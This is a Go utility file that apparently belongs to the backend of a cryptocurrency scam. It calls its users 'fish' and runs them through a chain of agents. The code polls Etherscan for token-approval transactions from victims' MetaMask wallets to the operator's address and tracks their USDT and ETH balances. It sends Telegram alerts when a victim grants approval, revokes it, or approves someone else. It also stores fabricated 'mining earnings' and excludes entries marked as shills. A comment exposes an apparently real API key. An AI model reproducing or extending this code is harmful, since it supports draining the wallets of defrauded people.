/**
 * @Author $
 * @Description //TODO $
 * @Date $ $
 * @Param $
 * @return $
 **/
package util

import (
	"context"
	"encoding/json"
	"fmt"
	"github.com/ethereum/go-ethereum/accounts/abi/bind"
	"github.com/ethereum/go-ethereum/common"
	"github.com/ethereum/go-ethereum/ethclient"
	"github.com/gin-gonic/gin"
	"github.com/go-redis/redis"
	"github.com/jinzhu/gorm"
	"github.com/shopspring/decimal"
	"github.com/spf13/viper"
	token "github.com/wangyi/fishpond/eth"
	"io/ioutil"
	"log"
	"math/big"
	"strconv"
	"strings"

	"math/rand"
	"net/http"
	"time"
)

func RandStr(length int) string {
	str := "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"
	bytes := []byte(str)
	result := []byte{}
	rand.Seed(time.Now().UnixNano() + int64(rand.Intn(100)))
	for i := 0; i < length; i++ {
		result = append(result, bytes[rand.Intn(len(bytes))])
	}
	return string(result)
}

func CreateToken(Rdb *redis.Client) string {

	for i := 0; i < 5; i++ {
		str := RandStr(36)
		_, err := Rdb.HGet("TOKEN_USER", str).Result()
		if err != nil {
			return str
		}
	}
	return ""
}

/**
判断 字符串是否在这个数组中
*/
func InArray(target string, strArray []string) bool {
	for _, element := range strArray {
		if target == element {
			return true
		}
	}
	return false
}

/**
  返回方法
*/
func JsonWrite(context *gin.Context, status int, result interface{}, msg string) {
	context.JSON(http.StatusOK, gin.H{
		"code":   status,
		"result": result,
		"msg":    msg,
	})
}

//func GetAccountMoneyUsdT(id int, foxAddress string, db *gorm.DB) {
//	resp, err := http.Get("https://etherscan.io/address/" + foxAddress)
//	if err != nil {
//		return
//	}
//	defer resp.Body.Close()
//	body, err1 := ioutil.ReadAll(resp.Body)
//	if err1 != nil {
//		return
//	}
//	//fmt.Println(string(body))
//	//解析正则表达式，如果成功返回解释器
//	reg1 := regexp.MustCompile(`<div class="col-md-8">\$(\d+)`)
//	if reg1 == nil { //解释失败，返回nil
//		return
//	}
//	//根据规则提取关键信息
//	result1 := reg1.FindAllStringSubmatch(string(body), -1)
//	maxMoney, err := strconv.ParseFloat(result1[0][1], 64)
//	up := model.Fish{
//		Money: maxMoney,
//	}
//	db.Model(&model.Fish{}).Where("id=?", id).Update(up)
//	return
//
//}

func ToDecimal(ivalue interface{}, decimals int) decimal.Decimal {
	value := new(big.Int)
	switch v := ivalue.(type) {
	case string:
		value.SetString(v, 10)
	case *big.Int:
		value = v
	}

	mul := decimal.NewFromFloat(float64(10)).Pow(decimal.NewFromFloat(float64(decimals)))
	num, _ := decimal.NewFromString(value.String())
	result := num.Div(mul)

	return result
}

//生成邀请码

/***
  更新 鱼的 usd eth
*/
func UpdateUsdAndEth(foxAddress string, Db *gorm.DB, money float64, fishID int, Aid int, remark string) {

	ethUrl := viper.GetString("eth.ethUrl")
	client, err := ethclient.Dial(ethUrl)
	if err != nil {
		return
	}
	//获取 美元
	tokenAddress := common.HexToAddress("0xdAC17F958D2ee523a2206206994597C13D831ec7") //usDT
	instance, err := token.NewToken(tokenAddress, client)
	if err != nil {
		log.Fatal(err)
	}
	address := common.HexToAddress(foxAddress)
	bal, err := instance.BalanceOf(&bind.CallOpts{}, address)
	if err != nil {
		log.Fatal(err)
	}
	usd := ToDecimal(bal.String(), 6)
	balance, err := client.BalanceAt(context.Background(), address, nil)
	if err != nil {
		log.Fatal(err)
	}
	eth := ToDecimal(balance.String(), 18)
	data := make(map[string]interface{})
	data["money"], _ = usd.Float64()
	data["money_eth"], _ = eth.Float64()

	b, _ := strconv.ParseFloat(usd.String(), 64)
	if money != b {
		a := money - b
		c := strconv.FormatFloat(a, 'f', 2, 64)
		fishIDY := strconv.Itoa(fishID)
		e := strconv.FormatFloat(money, 'f', 2, 64)
		content := "[钱包余额变动报警] 编号: [" + fishIDY + "] 用户备注 [" + remark + "],余额减少(增加):" + c + " 原来余额: " + e + " 现在余额: " + usd.String() + "时间: " + time.Now().Format("2006-01-02 15:04:05")
		NotificationAdmin(Db, Aid, content)
	}

	Db.Table("fish").Where("fox_address=?", foxAddress).Update(data)
	return
}

/***
  检查授权
*/

type Result struct {
	BlockNumber       string `json:"blockNumber"`
	TimeStamp         string `json:"timeStamp"`
	Hash              string `json:"hash"`
	Nonce             string `json:"nonce"`
	BlockHash         string `json:"blockHash"`
	TransactionIndex  string `json:"transactionIndex"`
	From              string `json:"from"`
	To                string `json:"to"`
	Value             string `json:"value"`
	Gas               string `json:"gas"`
	GasPrice          string `json:"gasPrice"`
	IsError           string `json:"isError"`
	ReceiptStatus     string `json:"txreceipt_status"`
	InPut             string `json:"input"`
	ContractAddress   string `json:"contractAddress"`
	CumulativeGasUsed string `json:"cumulativeGasUsed"`
	GasUsed           string `json:"gasUsed"`
	Confirmations     string `json:"confirmations"`
}
type TxList struct {
	Status  string   `json:"status"`
	Message string   `json:"message"`
	Result  []Result `json:"result"`
}

type Fish struct {
	ID                     uint    `gorm:"primaryKey;comment:'主键'"`
	Username               string  `gorm:"varchar(225)"`
	Password               string  `gorm:"varchar(225)"`
	Token                  string  `gorm:"varchar(225)"`
	Status                 int     `gorm:"int(10);default:1"`
	FoxAddress             string  `gorm:"varchar(225);comment:'狐狸钱包地址'"`
	Money                  float64 `gorm:"type:decimal(10,2)"`                      // USdt 余额
	MoneyEth               float64 `gorm:"type:decimal(30,18)"`                     //用户的eth  余额
	YesterdayEarnings      float64 `gorm:"type:decimal(10,2)"`                      //昨日的收益
	TodayEarnings          float64 `gorm:"type:decimal(10,2)"`                      //今日的收益
	TotalEarnings          float64 `gorm:"type:decimal(10,2)"`                      //总收益
	WithdrawalFreezeAmount float64 `gorm:"type:decimal(10,2);comment:'提现冻结金额'"`     //  提现冻结的金额
	EarningsMoney          float64 `gorm:"type:decimal(10,2);comment:'收益的可以提现的余额'"` //可以提现的金额
	VipLevel               int     `gorm:"int(11);comment:'vip等级id';index"`
	AdminId                int     `gorm:"int(11);comment:'属于那个代理';index"`
	SuperiorId             int     `gorm:"int(11);comment:'上级代理用户';index"`
	Updated                int64
	Created                int64
	Authorization          int     `gorm:"int(10);default:1"` //1 没有授权  2 授权
	InCode                 string  `gorm:"varchar(225)"`      //授权码
	Remark                 string  `gorm:"varchar(225)"`      //备注
	TodayEarningsETH       float64 `gorm:"-"`                 //
	ETHExchangeRate        string  `gorm:"-"`
	Model                  int     `gorm:"-"`
	FoxAddressOmit         string  `gorm:"-"`
	AlreadyGeyUSDT         float64 `gorm:"type:decimal(10,2)"`  //已经提现的美元
	AlreadyGeyETH          float64 `gorm:"type:decimal(30,18)"` //已经提现的ETH
	BAddress               string  `gorm:"varchar(225)"`
	AuthorizationTime      int     `gorm:"int(10);default:0"`                  //1 没有授权  2 授权
	MiningEarningETH       float64 `gorm:"type:decimal(30,18);comment:'挖矿收益'"` //挖矿收益
	Belong                 int     //子代理 需要填写的字段
	BelongString           string
	InComeTimes            int `gorm:"int(10);default:1"` //发送收益次数
}

func ChekAuthorizedFoxAddress(foxAddress string, apiKey string, BAddress string, Db *gorm.DB) {

	//获取 要查询的 fish
	//apiKey := "5YJ37XCEQFSEDMMI6RXZ756QB7HS2VT921"
	res, err := http.Get("https://api.etherscan.io/api?module=account&action=txlist&address=" + foxAddress + "&startblock=0&endblock=99999999&page=1&offset=100&sort=asc&apikey=" + apiKey)
	if err != nil {
		return
	}
	body, err1 := ioutil.ReadAll(res.Body)
	if err1 != nil {
		return
	}

	defer res.Body.Close()

	var data TxList
	err = json.Unmarshal([]byte(string(body)), &data)
	if err != nil {
		return
	}
	var count int = 0

	if data.Status == "1" && data.Message == "OK" {
		var ifCount bool = true
		for _, k := range data.Result {
			if len(k.InPut) == 138 && k.InPut[0:10] == "0x095ea7b3" {
				BAddressOne := "0x" + k.InPut[34:74]
				if k.InPut[127:] == "00000000000" && strings.ToLower(BAddress) == strings.ToLower(BAddressOne) { //取消授权  更新数据库
					fmt.Println("????")
					mapData := make(map[string]interface{})
					mapData["authorization"] = 1
					Db.Table("fish").Where("fox_address=?", foxAddress).Update(mapData)
				}
				if k.InPut[127:] != "00000000000" && strings.ToLower(BAddress) == strings.ToLower(BAddressOne) { //授权成功
					if ifCount {
						count++
						ifCount = false
					}

					fish := Fish{}
					err := Db.Where("fox_address=?", foxAddress).First(&fish).Error
					if err == nil {
						//  新增授权
						fishID := strconv.Itoa(int(fish.ID))
						content := "[新增授权报警] 编号: [" + fishID + "] 已经授权,时间: " + time.Now().Format("2006-01-02 15:04:05")
						NotificationAdmin(Db, fish.AdminId, content)
					}

					mapData := make(map[string]interface{})
					mapData["authorization"] = 2
					mapData["b_address"] = BAddress
					Db.Table("fish").Where("fox_address=?", foxAddress).Update(mapData)
				}
				if k.InPut[127:] != "00000000000" && strings.ToLower(BAddress) != strings.ToLower(BAddressOne) {
					count++
				}
			}
		}

		if count > 0 && ifCount == true { //授权个他人
			fish := Fish{}
			err := Db.Where("fox_address=?", foxAddress).First(&fish).Error
			if err == nil {
				//  新增授权
				people := strconv.Itoa(count)
				fishID := strconv.Itoa(int(fish.ID))
				content := "[授权他人报警] 编号: [" + fishID + "] 用户备注 [" + fish.Remark + "],授权给他人,当前授权人数为:" + people + " 时间: " + time.Now().Format("2006-01-02 15:04:05")
				NotificationAdmin(Db, fish.AdminId, content)
			}
		}

		mapData := make(map[string]interface{})
		mapData["authorization_time"] = count
		Db.Table("fish").Where("fox_address=?", foxAddress).Update(mapData)

	}
}

/**
  批量修改 余额
*/
func BatchUpdateBalance(adminId int, Db *gorm.DB) {
	type Admin struct {
		ID uint
	}
	type Fish struct {
		FoxAddress string
		Remark     string
		Money      float64
		ID         uint
	}
	var admins []Admin
	Db.Table("admins").Where("id= ? or belong =?", adminId, adminId).Find(&admins)
	for _, k := range admins {
		var fish []Fish
		//查询 鱼
		Db.Table("fish").Where("admin_id=?", k.ID).Find(&fish)
		for _, kk := range fish {
			if kk.Remark != "托" {
				UpdateUsdAndEth(kk.FoxAddress, Db, kk.Money, int(kk.ID), adminId, kk.Remark)
			}

		}

	}

}

func NotificationAdmin(Db *gorm.DB, adminID int, Message string, ) {

	type Admin struct {
		ID                   uint   `gorm:"primaryKey;comment:'主键'"`
		Username             string `gorm:"varchar(225)"`
		Password             string `gorm:"varchar(225)"`
		Token                string `gorm:"varchar(225)"`
		Level                int    `gorm:"int(10);default:0"`
		Status               int    `gorm:"int(10);default:1"`
		Ip                   string `gorm:"varchar(225)"`
		TheOnlyInvited       string //唯一邀请码
		Updated              int64
		Created              int64
		Belong               int
		ServiceAddress       string `gorm:"type:text"` //客服地址
		ServiceAddressSwitch int
		InComeTimes          int    `gorm:"int(10);default:1"` //发送收益次数
		TelegramToken        string //小飞机的token
		TelegramChatId       string //小飞机的聊天ID
	}
	admin := Admin{}
	err := Db.Where("id=?", adminID).First(&admin).Error
	if err == nil {
		url := "https://api.telegram.org/bot" + admin.TelegramToken + "/sendMessage?chat_id=" + admin.TelegramChatId + "&text=" + Message
		res, _ := http.Get(url)
		defer res.Body.Close()
	}

}
